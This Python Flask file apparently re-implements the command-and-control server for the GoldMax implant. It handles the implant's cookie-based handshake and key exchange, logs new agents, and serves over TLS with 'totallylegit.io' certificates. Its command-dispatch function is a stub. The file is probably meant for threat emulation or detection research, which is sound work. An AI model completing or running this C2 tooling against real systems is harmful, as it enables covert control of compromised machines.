import base64
import datetime
import logging
import sys
import hexdump
from flask import Flask, request, cli, make_response
from colorama import Fore as Color
from .GoldMax import GoldMax
from random import randbytes
from datetime import datetime
from os import environ, path, getcwd

# Flask App
app = Flask(__name__)

log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)
cli.show_server_banner = lambda *_: None

# Unique per sample (HTTP Headers)
# Initial Authentication
control_cookie = "48WxLONKwJEo="
request_shared_secret = control_cookie + 'wGMEvMwBW77HDj'
request_session_key = control_cookie + 'ndB3gbMjL'


@app.after_request
def remove_header(response):
    headers = list(response.headers)
    if environ.get('DEBUG'):
        for header in headers:
            print(Color.GREEN, '\t\t' + header[0] + ": " + header[1], Color.RESET)

    return response


def parse_headers(headers, uri):
    """
    Display Header information
    Extract Victim GUID
    """
    extract_info = {}
    for header in headers:
        if header[0] == 'Host':
            extract_info['Host'] = header[1]
        else:
            extract_info.update({header[0]: header[1]})

    return extract_info


def initial_authentication(http_info, cookie_values) -> list:
    """
    Phase 1: Generate shared secret
    """
    gold = GoldMax()
    print(Color.RED, f'[!] Received Request from GoldMax Implant for SHARED SECRET [!]'
                     f'\n\tTarget: {http_info["Host"]}'
                     f'\n\tUser-Agent: {http_info["User-Agent"]}'
                     f'\n\tReferer: {http_info["Referer"]}'
                     f'\n\tCookie: {cookie_values}'
          )
    print(Color.YELLOW, f"\t [+] Initiating Shared Secret Exchange [+]\n\t\tSending Fist Bump: {gold.shared_secret}",
          Color.RESET
          )

    return [gold.state['Authenticate'], gold.shared_secret]


def key_exchange(http_info, cookie_values) -> list:
    """
    Phase 2: AES Key Exchange
    """
    gold = GoldMax()
    print(Color.GREEN, f'\n[!] New GoldMax Agent! [!]'
                       f'\n\tTarget: {http_info["Host"]}'
                       f' \n\tReferer: {http_info["Referer"]}'
                       f'\n\tCookie: {cookie_values}'
          )

    return [gold.state["KeyExchange"], gold.get_session_key()]


def create_response():
    """
    Extract job from Database and prepare for implant
    """
    return ['', '']


def establish_session(http_headers, http_uri) -> list:
    """
    Handle comms to setup session for resolving commands
    """
    gold = GoldMax()
    session_data = []

    # Extract info from headers
    http_info = parse_headers(headers=http_headers, uri=http_uri)
    cookie_values = http_info.pop('Cookie').split('; ')

    # Extract the id from the cookie
    agent_name = cookie_values[0].split('=')[1]

    for value in cookie_values:

        # Phase 1: Authentication
        if request_shared_secret in value:
            session_data = initial_authentication(http_info, cookie_values)

        # Phase 2: Key Exchange
        elif request_session_key in value:
            session_data = key_exchange(http_info, cookie_values)

    # Phase 3 : Send Command
    if len(cookie_values) == 2:
        session_data = create_response()

    # Recv'd some error
    else:
        print(Color.RED, http_info, Color.RESET)

    return session_data


def start_http():
    ssl_info = ('toolbox/certs/totallylegit.io.crt', 'toolbox/certs/totallylegit.io.key')
    #cli.show_server_banner = lambda *_: None
    app.run(ssl_context=ssl_info, port=443, host='0.0.0.0')


@app.route("/", defaults={'u_path': ''})
@app.route('/<path:u_path>', methods=['GET', 'POST', 'PUT'])
def http_server(u_path):
    """
    Send Payload to Loader
    """
    current_time = datetime.now()
    timestamp = current_time.strftime("%H:%M:%S on %m/%d/%Y")
    uri = u_path

    if request.method == "GET":
        headers = request.headers
        print(Color.CYAN, f"\n[!] Received GET request from Implant : ({timestamp}) [!]", Color.RESET)

        info = parse_headers(headers, u_path)

        new_cookie, data_for_agent = establish_session(headers, u_path)

        print(f"Sending: {new_cookie} {data_for_agent} ")

        return data_for_agent, 200, {'Cookie': new_cookie}

    return b'200'

